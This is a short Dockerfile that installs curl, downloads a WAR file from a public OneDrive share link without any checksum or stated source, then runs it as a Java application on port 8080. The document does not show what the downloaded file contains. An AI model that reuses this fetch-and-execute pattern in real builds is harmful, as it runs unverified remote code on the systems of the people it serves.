FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.bl.files.1drv.com/y4meUgj-7ib5kLDm99b0tCG3g4RdbinMBedWCiXoSgjQW72gQ4klPWWNdUpt8JwLCSNMWvVP4EvQHHLGlGk4yxvAlHRRgsggPQjoXGQxcMcCSjoGrd83Z1CYNgN_R7bbIBzm3tLgUZa3epORwqsRXHCaA6V2q4WtVe660nc62pBCX-lv5y_DWiTzBBiM8WIW2X2TrzbacWkMyJbZR5G04zVnLZ2Nyv2XgpPJ-6N3EMHZAA?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
